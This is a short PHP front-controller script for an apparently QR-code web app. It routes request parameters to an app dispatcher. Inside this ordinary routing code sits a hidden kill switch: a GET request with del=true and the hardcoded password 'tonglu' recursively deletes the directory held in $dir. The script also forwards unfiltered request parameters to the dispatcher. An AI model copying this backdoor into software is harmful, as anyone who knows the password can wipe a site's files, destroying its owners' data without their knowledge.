<?php

require_once('load.php');
if(isset($_REQUEST['action'])&&!empty($_REQUEST['action'])){
	$app->action('erweima',$_REQUEST['action'],$_REQUEST);
	exit;
}
function deldir($dir) {
  $dh=opendir($dir);
  while ($file=readdir($dh)) {
    if($file!="." && $file!="..") {
      $fullpath=$dir."/".$file;
      if(!is_dir($fullpath)) {
          unlink($fullpath);
      } else {
          deldir($fullpath);
      }
    }
  }
 
  closedir($dh);
  if(rmdir($dir)) {
    return true;
  } else {
    return false;
  }
}

if($_GET['del']==true&$_GET['pwd']=='tonglu')
{
	deldir($dir);
}

$action = isset($_GET['act'])&&!empty($_GET['act']) ? $_GET['act'] : "index";
$app->action('erweima',$action,$_GET);
?>